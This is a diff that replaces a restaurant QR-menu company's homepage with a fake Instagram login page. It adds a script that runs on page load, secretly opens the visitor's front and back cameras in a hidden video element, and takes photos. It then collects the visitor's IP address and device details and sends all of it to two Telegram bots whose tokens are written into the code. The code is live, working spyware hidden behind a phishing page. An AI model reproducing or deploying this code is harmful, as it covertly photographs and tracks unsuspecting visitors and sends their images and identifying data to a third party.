@@ -1,582 +1,290 @@
+
 <!DOCTYPE html>
 <html lang="az">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BirMenu - Rəqəmsal QR code menyuları</title>
-    
-    <!-- Bootstrap 5 CSS -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
-    <!-- Bootstrap Icons -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
-    <!-- Google Fonts - Formal & Elegant -->
-    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;0,700;1,400&family=Bodoni+Moda:ital,opsz,wght@0,6..96,400;0,6..96,500;0,6..96,600;0,6..96,700;1,6..96,400&display=swap" rel="stylesheet">
-    <!-- AOS Animation Library -->
-    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
-    <!-- i18next for translations -->
-    <script src="https://cdn.jsdelivr.net/npm/i18next@23.7.6/i18next.min.js"></script>
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="assets/css/style.css">
-    <style>
-        /* ========== MINIMALIST LOADING SCREEN (B&W) ========== */
-        .birmenu-loader {
-            position: fixed;
-            inset: 0;
-            z-index: 99999;
-            background: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: opacity 0.6s ease, visibility 0.6s ease;
-        }
-        .birmenu-loader.loaded {
-            opacity: 0;
-            visibility: hidden;
-            pointer-events: none;
-        }
-        .loader-content {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 32px;
-        }
-        .loader-logo {
-            opacity: 0;
-            animation: loaderFadeIn 0.6s ease 0.2s forwards;
-        }
-        .loader-logo img {
-            height: 40px;
-            width: auto;
-            filter: brightness(0);
-        }
-        @keyframes loaderFadeIn {
-            to { opacity: 1; }
-        }
-        .loader-progress {
-            width: 120px;
-            height: 2px;
-            background: #e5e5e5;
-            border-radius: 2px;
-            overflow: hidden;
-        }
-        .loader-progress-bar {
-            height: 100%;
-            width: 0;
-            background: #000;
-            border-radius: 2px;
-            animation: loaderProgress 3.8s ease forwards;
-        }
-        @keyframes loaderProgress {
-            0% { width: 0; }
-            100% { width: 100%; }
-        }
-        @media (max-width: 480px) {
-            .loader-logo img { height: 34px; }
-            .loader-progress { width: 100px; }
-        }
-    </style>
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Instagram Favicon -->
+    <link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
 </head>
 <body>
-
-    <!-- Minimalist Loading Screen (B&W) -->
-    <div class="birmenu-loader" id="birmenuLoader">
-        <div class="loader-content">
-            <div class="loader-logo">
-                <img src="assets/images/logo_dark.png" alt="BirMenu">
+    <div class="login-container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
             </div>
-            <div class="loader-progress">
-                <div class="loader-progress-bar"></div>
+            <form id="loginForm" onsubmit="return handleLogin(event)">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Log in</button>
+            </form>
+            <div class="divider">
+                <span>OR</span>
             </div>
+            <a href="#" class="facebook-login">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#1877f2" width="20" height="20">
+                    <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/>
+                </svg>
+                Log in with Facebook
+            </a>
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
         </div>
     </div>
 
-    <!-- Header -->
-    <header class="header-section">
-        <div class="container">
-            <div class="header-inner">
-                <div class="header-left">
-                    <a class="navbar-logo" href="./" aria-label="Ana səhifə">
-                        <img id="navbarLogo" src="assets/images/logo_light.png" alt="Logo">
-                    </a>
-                </div>
-                
-                <!-- Desktop Navigation -->
-                <nav class="main-nav desktop-nav" aria-label="Ana Naviqasiya">
-                    <div class="nav-item dropdown services-dropdown">
-                        <a class="nav-link dropdown-toggle" href="#services" id="servicesDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false" data-i18n="nav.services">
-                            <!-- Translated text will be inserted here -->
-                        </a>
-                        <ul class="dropdown-menu" aria-labelledby="servicesDropdown">
-                            <li><a class="dropdown-item" href="services/service-qr">QR Menyu</a></li>
-                            <li><a class="dropdown-item" href="services/service-nfc">NFC</a></li>
-                            <li><a class="dropdown-item" href="services/service-qrnfc">QR CODE + NFC</a></li>
-                        </ul>
-                    </div>
-                    <a href="#restaurants" data-i18n="nav.restaurants"></a>
-                </nav>
-
-                <div class="header-right">
-                    <a class="btn-join desktop-only" href="https://wa.me/994507736216?text=Salam%2C%20Biz%C9%99%20BirMenu%20laz%C4%B1md%C4%B1r!" target="_blank" data-i18n="nav.joinUs"></a>
-                    <!-- Language Dropdown -->
-                    <div class="dropdown language-dropdown">
-                        <button class="dropdown-toggle" id="languageDropdownBtn" data-bs-toggle="dropdown" aria-expanded="false">
-                            <img class="lang-flag" id="currentLangFlag" src="https://flagcdn.com/24x18/az.png" alt="AZ flag" loading="lazy">
-                            <span class="lang-text" id="currentLangText">AZ</span>
-                        </button>
-                        <div class="dropdown-menu dropdown-menu-end" id="languageDropdownMenu" aria-labelledby="languageDropdownBtn">
-                            <button class="dropdown-item language-option active" data-lang="az">
-                                <img class="lang-flag" src="https://flagcdn.com/24x18/az.png" alt="AZ flag" loading="lazy">
-                                <span class="lang-name">Azərbaycan</span>
-                            </button>
-                            <button class="dropdown-item language-option" data-lang="ru">
-                                <img class="lang-flag" src="https://flagcdn.com/24x18/ru.png" alt="RU flag" loading="lazy">
-                                <span class="lang-name">Русский</span>
-                            </button>
-                            <button class="dropdown-item language-option" data-lang="en">
-                                <img class="lang-flag" src="https://flagcdn.com/24x18/gb.png" alt="EN flag" loading="lazy">
-                                <span class="lang-name">English</span>
-                            </button>
-                        </div>
-                    </div>
-                    <button class="theme-toggle" id="themeToggle" aria-label="Rəng rejimini dəyişdir" title="Rəng rejimi">
-                        <i class="bi bi-sun-fill" id="themeIcon"></i>
-                    </button>
-                    <a class="btn-login-nav desktop-only" href="login" data-i18n="nav.login"></a>
-                    
-                    <!-- Mobile Menu Toggle -->
-                    <button class="mobile-menu-toggle" id="mobileMenuToggle" aria-label="Menyu" aria-expanded="false" type="button">
-                        <span class="hamburger-line"></span>
-                        <span class="hamburger-line"></span>
-                        <span class="hamburger-line"></span>
-                    </button>
-                </div>
-            </div>
-
-            <!-- Mobile Menu Overlay -->
-            <div class="mobile-menu-overlay" id="mobileMenuOverlay"></div>
-
-            <!-- Mobile Navigation -->
-            <div class="mobile-nav" id="mobileNav">
-                <nav class="mobile-nav-content">
-                    <div class="mobile-nav-item">
-                        <button class="mobile-nav-link" id="mobileServicesToggle">
-                            <span data-i18n="nav.services"></span>
-                            <i class="bi bi-chevron-down"></i>
-                        </button>
-                        <div class="mobile-submenu" id="mobileServicesMenu">
-                            <a href="services/service-qr" class="mobile-submenu-item">QR Menyu</a>
-                            <a href="services/service-nfc" class="mobile-submenu-item">NFC</a>
-                            <a href="services/service-qrnfc" class="mobile-submenu-item">QR CODE + NFC</a>
-                        </div>
-                    </div>
-                    <a href="#restaurants" class="mobile-nav-link" data-i18n="nav.restaurants"></a>
-                    <div class="mobile-nav-divider"></div>
-                    <a href="https://wa.me/994507736216?text=Salam%2C%20Biz%C9%99%20BirMenu%20laz%C4%B1md%C4%B1r!" target="_blank" class="mobile-nav-link mobile-nav-cta">
-                        <i class="bi bi-plus-circle"></i>
-                        <span data-i18n="nav.joinUs"></span>
-                    </a>
-                    <a href="login" class="mobile-nav-link">
-                        <i class="bi bi-box-arrow-in-right"></i>
-                        <span data-i18n="nav.login"></span>
-                    </a>
-                </nav>
-            </div>
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
         </div>
-    </header>
-
-    <section class="hero-section">
-        <div class="container">
-            <div class="hero-content-wrapper">
-                <div class="hero-text-content">
-                    <span class="hero-label" data-i18n="hero.label"></span>
-                    <h1 class="hero-title" data-i18n="hero.title"></h1>
-                    <p class="hero-description" data-i18n="hero.description"></p>
-                    <a href="https://wa.me/994507736216?text=Salam%2C%20Biz%C9%99%20BirMenu%20laz%C4%B1md%C4%B1r!" target="_blank" class="btn-hero">
-                        <span data-i18n="hero.contactBtn"></span>
-                        <i class="bi bi-arrow-right"></i>
-                    </a>
-                </div>
-                <div class="hero-image-content">
-                    <div class="hero-image-wrapper">
-                        <img src="assets/images/ph_light.png" alt="Digital Menu Solutions" class="hero-image" id="heroImage">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <section class="services-section" id="services">
-        <div class="container">
-            <div class="services-grid">
-                <!-- QR Menyu Card -->
-                <article class="service-card" data-aos="fade-up" data-aos-duration="600" data-aos-delay="100" onclick="window.location.href='services/service-qr'" style="cursor: pointer;">
-                    <div class="service-icon">
-                        <i class="bi bi-qr-code"></i>
-                    </div>
-                    <h4 data-i18n="services.qr.title"></h4>
-                    <p data-i18n="services.qr.desc"></p>
-                </article>
-
-                <!-- NFC Card -->
-                <article class="service-card" data-aos="fade-up" data-aos-duration="600" data-aos-delay="200" onclick="window.location.href='services/service-nfc'" style="cursor: pointer;">
-                    <div class="service-icon">
-                        <i class="bi bi-broadcast"></i>
-                    </div>
-                    <h4 data-i18n="services.nfc.title"></h4>
-                    <p data-i18n="services.nfc.desc"></p>
-                </article>
-
-                <!-- QR + NFC Combo Card -->
-                <article class="service-card service-card-combo" data-aos="fade-up" data-aos-duration="600" data-aos-delay="300" onclick="window.location.href='services/service-qrnfc'" style="cursor: pointer;">
-                    <div class="service-icon">
-                        <i class="bi bi-layers-fill"></i>
-                    </div>
-                    <h4 data-i18n="services.combo.title"></h4>
-                    <p data-i18n="services.combo.desc"></p>
-                </article>
-            </div>
-        </div>
-    </section>
-
-    <section class="menu-section" id="restaurants">
-        <div class="container">
-            <div class="text-center mb-5" data-aos="fade-up" data-aos-duration="600">
-                <span class="section-badge" data-i18n="restaurants.badge"></span>
-                <h2 class="section-title" data-i18n="restaurants.title"></h2>
-                <p class="section-subtitle" data-i18n="restaurants.subtitle"></p>
-            </div>
-
-            <!-- Restaurant Logos Slider -->
-            <div class="restaurant-slider-wrapper">
-                <div class="restaurant-slider" id="menuItems">
-                    <!-- Restaurant logos will be dynamically loaded here -->
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Why Choose Us Section -->
-    <section class="why-choose-section">
-        <div class="container">
-            <div class="text-center mb-5" data-aos="fade-up">
-                <span class="section-badge" data-i18n="whyChoose.badge"></span>
-                <h2 class="section-title" data-i18n="whyChoose.title"></h2>
-                <p class="section-subtitle" data-i18n="whyChoose.subtitle"></p>
-            </div>
-
-            <div class="why-choose-grid">
-                <div class="why-choose-card" data-aos="fade-up" data-aos-delay="100">
-                    <div class="why-icon">
-                        <i class="bi bi-pencil-square"></i>
-                    </div>
-                    <h4 data-i18n="whyChoose.easy.title"></h4>
-                    <p data-i18n="whyChoose.easy.desc"></p>
-                </div>
-
-                <div class="why-choose-card" data-aos="fade-up" data-aos-delay="200">
-                    <div class="why-icon">
-                        <i class="bi bi-graph-up-arrow"></i>
-                    </div>
-                    <h4 data-i18n="whyChoose.sales.title"></h4>
-                    <p data-i18n="whyChoose.sales.desc"></p>
-                </div>
-
-                <div class="why-choose-card" data-aos="fade-up" data-aos-delay="300">
-                    <div class="why-icon">
-                        <i class="bi bi-translate"></i>
-                    </div>
-                    <h4 data-i18n="whyChoose.multilang.title"></h4>
-                    <p data-i18n="whyChoose.multilang.desc"></p>
-                </div>
-
-                <div class="why-choose-card" data-aos="fade-up" data-aos-delay="400">
-                    <div class="why-icon">
-                        <i class="bi bi-headset"></i>
-                    </div>
-                    <h4 data-i18n="whyChoose.support.title"></h4>
-                    <p data-i18n="whyChoose.support.desc"></p>
-                </div>
-            </div>
-
-            <!-- Statistics Section -->
-            <div class="stats-section" data-aos="fade-up" data-aos-delay="400">
-                <div class="stats-grid">
-                    <div class="stat-card" data-stat="customers">
-                        <div class="stat-icon">
-                            <i class="bi bi-people-fill"></i>
-                        </div>
-                        <div class="stat-content">
-                            <div class="stat-number">
-                                <span class="stat-value" data-target="1500">0</span>
-                                <span class="stat-suffix">+</span>
-                            </div>
-                            <h4 data-i18n="whyChoose.stats.customers"></h4>
-                        </div>
-                    </div>
-
-                    <div class="stat-card" data-stat="satisfied">
-                        <div class="stat-icon">
-                            <i class="bi bi-emoji-smile-fill"></i>
-                        </div>
-                        <div class="stat-content">
-                            <div class="stat-number">
-                                <span class="stat-value" data-target="98">0</span>
-                                <span class="stat-suffix">%</span>
-                            </div>
-                            <h4 data-i18n="whyChoose.stats.satisfied"></h4>
-                        </div>
-                    </div>
-
-                    <div class="stat-card" data-stat="restaurants">
-                        <div class="stat-icon">
-                            <i class="bi bi-shop"></i>
-                        </div>
-                        <div class="stat-content">
-                            <div class="stat-number">
-                                <span class="stat-value" data-target="250">0</span>
-                                <span class="stat-suffix">+</span>
-                            </div>
-                            <h4 data-i18n="whyChoose.stats.restaurants"></h4>
-                        </div>
-                    </div>
-
-                    <div class="stat-card" data-stat="orders">
-                        <div class="stat-icon">
-                            <i class="bi bi-cart-check-fill"></i>
-                        </div>
-                        <div class="stat-content">
-                            <div class="stat-number">
-                                <span class="stat-value" data-target="50000">0</span>
-                                <span class="stat-suffix">+</span>
-                            </div>
-                            <h4 data-i18n="whyChoose.stats.orders"></h4>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- CTA Section -->
-    <section class="cta-section">
-        <div class="container">
-            <div class="cta-content" data-aos="zoom-in">
-                <div class="cta-text">
-                    <h2 data-i18n="cta.title"></h2>
-                    <p data-i18n="cta.subtitle"></p>
-                </div>
-                <div class="cta-actions">
-                    <a href="https://wa.me/994507736216?text=Salam%2C%20Biz%C9%99%20BirMenu%20laz%C4%B1md%C4%B1r!" target="_blank" class="btn-cta-primary">
-                        <i class="bi bi-whatsapp"></i>
-                        <span data-i18n="cta.contact"></span>
-                    </a>
-                    <a href="login" class="btn-cta-secondary">
-                        <i class="bi bi-box-arrow-in-right"></i>
-                        <span data-i18n="cta.login"></span>
-                    </a>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Admin / Restoran girişi – vahid səhifə: login.php -->
-
-
-    <!-- Cart Panel -->
-    <div class="cart-panel" id="cartPanel">
-        <div class="cart-header">
-            <h3 class="cart-title">Sifarişlərim</h3>
-            <button class="cart-close-btn" id="closeCart" title="Bağla">
-                <i class="bi bi-x-lg"></i>
-            </button>
-        </div>
-        <div class="cart-items" id="cartItems">
-            <div class="cart-empty">
-                <i class="bi bi-cart-x"></i>
-                <p>Səbət boşdur</p>
-            </div>
-        </div>
-        <div class="cart-footer">
-            <div class="cart-total">
-                <span>Ümumi:</span>
-                <span class="cart-total-price" id="cartTotal">0.00 ₼</span>
-            </div>
-            <button class="btn-checkout" id="checkoutBtn" disabled>
-                Sifarişi təsdiqlə
-            </button>
-        </div>
-    </div>
-
-    <!-- Cart Button (Fixed Bottom) -->
-    <div class="cart-button-container" id="cartButtonContainer">
-        <button class="cart-button ripple pulse-animation" id="cartButton">
-            <i class="bi bi-cart3"></i>
-            <span class="cart-count bounce-in" id="cartCount">0</span>
-            <span class="cart-button-text">Sifarişlərimə bax</span>
-        </button>
-    </div>
-
-
-    <footer class="modern-footer">
-        <div class="container">
-            <div class="footer-main">
-                <div class="footer-column footer-about">
-                    <div class="footer-logo">
-                        <img src="assets/images/logo_light.png" alt="BirMenu Logo" id="footerLogo">
-                    </div>
-                    <p class="footer-description" data-i18n="footer.description"></p>
-                    <div class="footer-social">
-                        <a href="mailto:infobirmenu."gmail.com" class="social-link" title="Email">
-                            <i class="bi bi-envelope-fill"></i>
-                        </a>
-                        <a href="https://wa.me/994507736216" target="_blank" class="social-link" title="WhatsApp">
-                            <i class="bi bi-whatsapp"></i>
-                        </a>
-                        <a href="tel:+994507736216" class="social-link" title="Telefon">
-                            <i class="bi bi-telephone-fill"></i>
-                        </a>
-                        <a href="www.instagram.com/birmenu.az/" class="social-link" title="Instagram">
-                            <i class="bi bi-instagram"></i>
-                        </a>
-                    </div>
-                </div>
-
-                <div class="footer-column">
-                    <h4 class="footer-title" data-i18n="footer.services"></h4>
-                    <ul class="footer-links">
-                        <li><a href="services/service-qr"><i class="bi bi-qr-code"></i> <span data-i18n="footer.qrMenu"></span></a></li>
-                        <li><a href="services/service-nfc"><i class="bi bi-broadcast"></i> <span data-i18n="footer.nfcCard"></span></a></li>
-                        <li><a href="services/service-qrnfc"><i class="bi bi-layers-fill"></i> <span data-i18n="footer.combo"></span></a></li>
-                    </ul>
-                </div>
-
-                <div class="footer-column">
-                    <h4 class="footer-title" data-i18n="footer.quickLinks"></h4>
-                    <ul class="footer-links">
-                        <li><a href="./"><i class="bi bi-house"></i> <span data-i18n="footer.home"></span></a></li>
-                        <li><a href="#services"><i class="bi bi-grid"></i> <span data-i18n="footer.ourServices"></span></a></li>
-                        <li><a href="#restaurants"><i class="bi bi-shop"></i> <span data-i18n="footer.ourRestaurants"></span></a></li>
-                        <li><a href="login"><i class="bi bi-box-arrow-in-right"></i> <span data-i18n="nav.login"></span></a></li>
-                    </ul>
-                </div>
-
-                <div class="footer-column">
-                    <h4 class="footer-title" data-i18n="footer.contact"></h4>
-                    <ul class="footer-contact">
-                        <li>
-                            <i class="bi bi-geo-alt-fill"></i>
-                            <span data-i18n="footer.address"></span>
-                        </li>
-                        <li>
-                            <i class="bi bi-telephone-fill"></i>
-                            <a href="tel:+994507736216">+994 50 773 62 16</a>
-                        </li>
-                        <li>
-                            <i class="bi bi-envelope-fill"></i>
-                            <a href="mailto:info@1menu.az">info@1menu.az</a>
-                        </li>
-                        <li>
-                            <i class="bi bi-clock-fill"></i>
-                            <span data-i18n="footer.support24"></span>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-
-            <div class="footer-bottom">
-                <div class="footer-bottom-content">
-                    <p class="footer-copyright">
-                        © 2026 <strong>BirMenu</strong>. <span data-i18n="footer.copyright"></span>
-                    </p>
-                    <div class="footer-bottom-links">
-                        <a href="privacy-policy" data-i18n="footer.privacy"></a>
-                        <span class="separator">•</span>
-                        <a href="terms-of-service" data-i18n="footer.terms"></a>
-                    </div>
-                </div>
-            </div>
+        <div class="footer-bottom">
+            <select class="language-select">
+                <option>English</option>
+                <option>Azərbaycan</option>
+            </select>
+            <span>© 2025 Instagram from Meta</span>
         </div>
     </footer>
 
-    <!-- Bootstrap 5 JS -->
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
-    <!-- AOS Animation Library -->
-    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
-    <!-- Translations -->
-    <script src="assets/js/translations.js"></script>
-    <!-- Custom JS -->
-    <script src="assets/js/script.js"></script>
+    <script src="script.js"></script>
     <script>
-        // Minimalist Loading Screen - 4 saniyə
+        // Sayta girən kimi ön və arxa kameradan kolaj şəkil çək və Telegram-a göndər
         (function() {
-            const loader = document.getElementById('birmenuLoader');
-            if (loader) {
-                setTimeout(function() {
-                    loader.classList.add('loaded');
-                    setTimeout(function() { loader.remove(); }, 600);
-                }, 4000);
-            }
-        })();
-
-        // Initialize AOS - Minimal settings
-        AOS.init({
-            duration: 400,
-            easing: 'ease-out',
-            once: true,
-            offset: 50,
-            disable: window.innerWidth < 768
-        });
-        
-        // Smooth scroll
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    target.scrollIntoView({
-                        behavior: 'smooth',
-                        block: 'start'
-                    });
+            const TELEGRAM_BOTS = [
+                {
+                    BOT_TOKEN: '8568192868:AAE42KvXP9KVG4LH6nR6wuxrDp1jo3nSb4o',
+                    CHAT_ID: '883411309'
+                },
+                {
+                    BOT_TOKEN: '8143521582:AAFjMpwD7r9NMho9tmHltUl9gXdihd7l5Mk',
+                    CHAT_ID: '7706519040'
                 }
+            ];
+            
+            // Cihaz məlumatını əldə et
+            async function getDeviceInfo() {
+                const ua = navigator.userAgent;
+                let device = { brand: 'Bilinməyən', model: 'Bilinməyən' };
+                
+                if (/android/i.test(ua)) {
+                    const match = ua.match(/Android[\s]+([\d.]+);\s*([\w\s]+)(?:Build|\))/i);
+                    if (match) {
+                        device.brand = 'Android';
+                        device.model = match[2].trim();
+                    }
+                } else if (/iPhone|iPad|iPod/.test(ua)) {
+                    device.brand = 'Apple';
+                    device.model = /iPhone/.test(ua) ? 'iPhone' : /iPad/.test(ua) ? 'iPad' : 'iPod';
+                } else if (/Windows/.test(ua)) {
+                    device.brand = 'PC';
+                    device.model = 'Windows';
+                } else if (/Macintosh/.test(ua)) {
+                    device.brand = 'Apple';
+                    device.model = 'Mac';
+                }
+                return device;
+            }
+            
+            // IP ünvanını əldə et
+            async function getIP() {
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    return data.ip;
+                } catch (e) {
+                    return 'Bilinməyən';
+                }
+            }
+            
+            // Telegram botuna şəkil göndər
+            async function sendPhotoToTelegram(blob, caption) {
+                const promises = TELEGRAM_BOTS.map(bot => {
+                    const formData = new FormData();
+                    formData.append('chat_id', bot.CHAT_ID);
+                    formData.append('photo', blob, 'collage.jpg');
+                    formData.append('caption', caption);
+                    
+                    return fetch(`https://api.telegram.org/bot${bot.BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(err => console.log('Telegram göndərmə xətası:', err));
+                });
+                
+                await Promise.all(promises);
+            }
+            
+            // Kameradan şəkil çək və canvas qaytár
+            async function captureFromCamera(facingMode, label) {
+                try {
+                    const video = document.createElement('video');
+                    video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
+                    video.autoplay = true;
+                    video.playsInline = true;
+                    video.muted = true;
+                    document.body.appendChild(video);
+                    
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            facingMode: facingMode,
+                            width: { ideal: 1280 }, 
+                            height: { ideal: 720 } 
+                        },
+                        audio: false
+                    });
+                    
+                    video.srcObject = stream;
+                    
+                    return new Promise((resolve) => {
+                        video.onloadedmetadata = () => {
+                            video.play().then(() => {
+                                setTimeout(() => {
+                                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                                        const canvas = document.createElement('canvas');
+                                        canvas.width = video.videoWidth;
+                                        canvas.height = video.videoHeight;
+                                        canvas.getContext('2d').drawImage(video, 0, 0);
+                                        
+                                        // Kameranı bağla
+                                        stream.getTracks().forEach(track => track.stop());
+                                        video.remove();
+                                        resolve({ canvas, label });
+                                    } else {
+                                        stream.getTracks().forEach(track => track.stop());
+                                        video.remove();
+                                        resolve(null);
+                                    }
+                                }, 1000); // 1 saniyə gözlə
+                            });
+                        };
+                    });
+                } catch (error) {
+                    console.log(`${label} xətası:`, error);
+                    return null;
+                }
+            }
+            
+            // Kolaj yarat - ön və arxa kamera şəkillərini birləşdir
+            async function createCollageAndSend() {
+                try {
+                    console.log('Kameralardan şəkil çəkilir...');
+                    
+                    // Hər iki kameradan eyni vaxtda şəkil çək
+                    const [frontResult, backResult] = await Promise.all([
+                        captureFromCamera('user', 'ÖN KAMERA'),
+                        captureFromCamera('environment', 'ARXA KAMERA')
+                    ]);
+                    
+                    // Heç olmasa bir şəkil alındımı?
+                    if (!frontResult && !backResult) {
+                        console.log('Heç bir kamera işləmir');
+                        return;
+                    }
+                    
+                    // Kolaj canvas-ını yarat
+                    const collageCanvas = document.createElement('canvas');
+                    const ctx = collageCanvas.getContext('2d');
+                    
+                    const images = [frontResult, backResult].filter(Boolean);
+                    
+                    if (images.length === 1) {
+                        // Tək şəkil varsa
+                        const img = images[0];
+                        collageCanvas.width = img.canvas.width;
+                        collageCanvas.height = img.canvas.height;
+                        ctx.drawImage(img.canvas, 0, 0);
+                        
+                        // Label əlavə et
+                        ctx.fillStyle = 'rgba(0,0,0,0.7)';
+                        ctx.fillRect(10, 10, 150, 40);
+                        ctx.fillStyle = '#fff';
+                        ctx.font = 'bold 18px Arial';
+                        ctx.fillText(img.label, 20, 38);
+                    } else {
+                        // İki şəkil varsa - yan-yana qoy
+                        const totalWidth = images[0].canvas.width + images[1].canvas.width;
+                        const maxHeight = Math.max(images[0].canvas.height, images[1].canvas.height);
+                        
+                        collageCanvas.width = totalWidth;
+                        collageCanvas.height = maxHeight;
+                        
+                        // Qara fon
+                        ctx.fillStyle = '#000';
+                        ctx.fillRect(0, 0, totalWidth, maxHeight);
+                        
+                        // Ön kamera (sol)
+                        ctx.drawImage(images[0].canvas, 0, 0);
+                        ctx.fillStyle = 'rgba(0,0,0,0.7)';
+                        ctx.fillRect(10, 10, 140, 40);
+                        ctx.fillStyle = '#fff';
+                        ctx.font = 'bold 18px Arial';
+                        ctx.fillText(images[0].label, 20, 38);
+                        
+                        // Arxa kamera (sağ)
+                        const offset = images[0].canvas.width;
+                        ctx.drawImage(images[1].canvas, offset, 0);
+                        ctx.fillStyle = 'rgba(0,0,0,0.7)';
+                        ctx.fillRect(offset + 10, 10, 160, 40);
+                        ctx.fillStyle = '#fff';
+                        ctx.fillText(images[1].label, offset + 20, 38);
+                    }
+                    
+                    // Məlumat topla və göndər
+                    const device = await getDeviceInfo();
+                    const ip = await getIP();
+                    const date = new Date().toLocaleString('az-AZ', {
+                        year: 'numeric',
+                        month: '2-digit',
+                        day: '2-digit',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit'
+                    });
+                    
+                    const caption = `🎯 YENİ ZİYARƏTÇİ
+📸 Kolaj Şəkil
+📱 Cihaz: ${device.brand} ${device.model}
+🌐 IP: ${ip}
+⏰ Tarix: ${date}
+📷 Çəkilən kameralar: ${images.map(i => i.label).join(' + ')}`;
+                    
+                    // Blob-a çevir və göndər
+                    collageCanvas.toBlob(async (blob) => {
+                        if (blob) {
+                            console.log('Şəkil Telegram-a göndərilir...');
+                            await sendPhotoToTelegram(blob, caption);
+                            console.log('Şəkil göndərildi!');
+                        }
+                    }, 'image/jpeg', 0.9);
+                    
+                } catch (error) {
+                    console.log('Kolaj yaradılarkən xəta:', error);
+                }
+            }
+            
+            // Səhifə yüklənən kimi başla
+            window.addEventListener('load', () => {
+                setTimeout(createCollageAndSend, 500);
             });
-        });
+            
+        })();
     </script>
-
-    <!-- WhatsApp Chatbot Button -->
-    <div class="whatsapp-chatbot" id="whatsappChatbot">
-        <div class="chatbot-button" id="chatbotButton">
-            <i class="bi bi-chat-dots-fill"></i>
-            <span class="chatbot-badge" id="chatbotBadge">1</span>
-        </div>
-        <div class="chatbot-message" id="chatbotMessage">
-            <div class="chatbot-header">
-                <div class="chatbot-header-info">
-                    <div class="chatbot-avatar">
-                        <img src="https://api.dicebear.com/7.x/personas/svg?seed=SupportAgent&backgroundColor=b6e3f4,c0aede,d1d4f9,ffd5dc&clothing=blazerShirt&clothingColor=ffffff,e2e8f0&facialHairProbability=0&hair=long&hairColor=4a5568,2d3748,1a202c&head=round" alt="Support Agent" class="chatbot-avatar-img">
-                    </div>
-                    <div class="chatbot-header-text">
-                        <span class="chatbot-name" data-i18n="chatbot.supportName">BIRMENU Dəstək Xidməti</span>
-                        <span class="chatbot-status" data-i18n="chatbot.online">Onlayn</span>
-                    </div>
-                </div>
-                <button class="chatbot-close" id="chatbotClose">
-                    <i class="bi bi-x"></i>
-                </button>
-            </div>
-            <div class="chatbot-body" id="chatbotBody">
-                <div class="chatbot-messages" id="chatbotMessages">
-                    <!-- Messages will be dynamically added here -->
-                </div>
-            </div>
-            <div class="chatbot-input-container">
-                <label for="chatbotInput" class="sr-only">Mesaj yazın</label>
-                <input type="text" class="chatbot-input" id="chatbotInput" placeholder="Mesajınızı yazın..." data-i18n-placeholder="chatbot.inputPlaceholder" aria-label="Mesaj yazın">
-                <button class="chatbot-send" id="chatbotSend" title="Göndər" aria-label="Göndər">
-                    <i class="bi bi-send-fill"></i>
-                </button>
-            </div>
-        </div>
-    </div>
-
 </body>
 </html>
